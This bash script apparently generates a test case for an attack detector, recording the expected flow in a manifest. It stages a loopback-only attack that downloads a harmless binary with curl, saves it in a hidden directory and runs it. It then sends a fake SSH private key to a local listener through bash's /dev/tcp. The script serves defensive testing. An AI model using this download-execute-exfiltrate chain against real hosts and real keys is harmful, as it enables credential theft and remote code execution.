#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# trace: full
# Attack 1, download, execute, exfiltrate (all on loopback, every payload harmless):
#   a stager (http.server on 18000) serves a binary (a copy of `id`); the victim's shell downloads
#   it into a hidden cache directory, makes it executable and runs it (R1, a dropper); then the
#   shell sends a fake private key to a catcher on 14444 through bash's /dev/tcp (cat > socket).
# Ground truth (manifest): the key file's path, the catcher's port, the key's size.
set -eu
W=$1 M=$2 H=$(dirname "$0")/..
mkdir -p "$W/stager" "$W/home/.ssh" "$W/home/.cache"
cp /usr/bin/id "$W/stager/upd"
head -c 3072 /dev/urandom | base64 >"$W/home/.ssh/id_fake"
size=$(stat -c %s "$W/home/.ssh/id_fake")
python3 -u -m http.server 18000 --bind 127.0.0.1 --directory "$W/stager" >"$W/stager.log" 2>&1 &
STG=$!
python3 "$H/catcher.py" 14444 "$W/caught.bin" "$W/ready" &
CAT=$!
for i in $(seq 100); do grep -q "Serving HTTP" "$W/stager.log" && [ -f "$W/ready" ] && break; sleep 0.1; done
bash -c "curl -s http://127.0.0.1:18000/upd -o '$W/home/.cache/upd'; chmod +x '$W/home/.cache/upd'; '$W/home/.cache/upd'; cat '$W/home/.ssh/id_fake' >/dev/tcp/127.0.0.1/14444"
wait $CAT
kill $STG; wait $STG 2>/dev/null || true
cmp "$W/caught.bin" "$W/home/.ssh/id_fake" && echo "exfiltrated $size bytes"
cat >"$M" <<J
{"reach": [{"name": "fake key to the catcher", "from": {"path": "$W/home/.ssh/id_fake"}, "to": {"listener_port": 14444}, "bytes": $size}],
 "rules": ["R1"]}
J
